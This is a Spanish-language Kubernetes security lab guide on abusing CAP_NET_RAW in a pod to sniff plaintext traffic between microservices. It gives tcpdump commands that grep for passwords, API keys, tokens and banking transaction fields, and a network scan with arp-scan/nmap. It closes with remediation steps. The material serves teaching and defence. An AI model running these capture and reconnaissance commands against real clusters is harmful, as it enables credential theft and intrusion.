# Lab 3: Abuso de CAP_NET_RAW — Sniffing de Trafico Interno

## Objetivo

Demostrar como un Pod con las capabilities `CAP_NET_RAW` y `CAP_NET_ADMIN` puede capturar trafico HTTP en texto plano entre microservicios, interceptando credenciales y tokens.

## Caso Real: Hildegard (2021)

El malware **Hildegard** del grupo TeamTNT usaba capabilities de red en contenedores Kubernetes para realizar reconocimiento de red, interceptar trafico interno y moverse lateralmente entre nodos del cluster para desplegar criptomineros.

---

## Archivos

| Archivo | Descripcion |
|---------|-------------|
| `vulnerable-capabilities.yaml` | Backend API + Frontend client + Sniffer con CAP_NET_RAW |
| `traffic-generator.yaml` | Pod con script Python que genera trafico HTTP/2 transaccional bancario |

---

## Fase 1: Desplegar Escenario Vulnerable

```bash
kubectl apply -f vulnerable-capabilities.yaml
kubectl apply -f traffic-generator.yaml
kubectl get pods -n lab1-caps -w
# Esperar a que los 4 pods esten Running
```

## Fase 2: Verificar trafico HTTP en texto plano

### Paso 1: Ver los logs del frontend enviando credenciales

```bash
kubectl logs -n lab1-caps frontend-client -f
# Debe mostrar: [CLIENT] Sending login request... cada 10 segundos
```

### Paso 2: Ver los logs del backend recibiendo credenciales

```bash
kubectl logs -n lab1-caps backend-api -f
# Debe mostrar: [LOGIN] Received: {"username":"admin@empresa.com","password":"Sup3rS3cr3t!"...}
```

## Fase 3: Explotacion — Sniffing con tcpdump

### Paso 1: Acceder al pod sniffer

```bash
kubectl exec -it -n lab1-caps sniffer-pod -- bash
```

### Paso 2: Capturar trafico HTTP

```bash
# Capturar trafico en el puerto 8080 (backend-api — credenciales login)
tcpdump -i any -A port 8080 2>/dev/null | grep -E "(password|api_key|token|username)"
# Esperar ~10 segundos...
# Debe capturar: {"username":"admin@empresa.com","password":"Sup3rS3cr3t!","api_key":"sk-live-abcdef123456"}
```

### Paso 2b: Capturar trafico HTTP/2 transaccional

```bash
# Capturar trafico del traffic-generator (transacciones bancarias)
tcpdump -i any -A 2>/dev/null | grep -E "(SourceAccount|DestinationAccount|Amount|TransactionID)"
# Debe capturar datos de transacciones bancarias con cuentas, montos y referencias
```

### Paso 3: Captura mas detallada

```bash
# Ver paquetes HTTP completos
tcpdump -i any -A -s 0 port 8080 2>/dev/null | head -100
```

### Paso 4: ARP scan de la red (reconocimiento)

```bash
# Escanear red local
arp-scan --localnet 2>/dev/null || nmap -sn 10.244.0.0/24
```

## Fase 4: Verificar el impacto

```bash
# Desde fuera del pod, verificar capabilities asignadas
kubectl exec -n lab1-caps sniffer-pod -- cat /proc/1/status | grep -i cap
```

---

## Remediacion

Para mitigar este ataque:

1. **Eliminar capabilities innecesarias**: `drop: ["ALL"]`
2. **Usar NetworkPolicy**: Restringir trafico entre pods
3. **Implementar mTLS**: Cifrar trafico entre microservicios (Istio, Linkerd)
4. **PSA restricted**: Prevenir capabilities peligrosas

---

## Cleanup

```bash
kubectl delete namespace lab1-caps
```
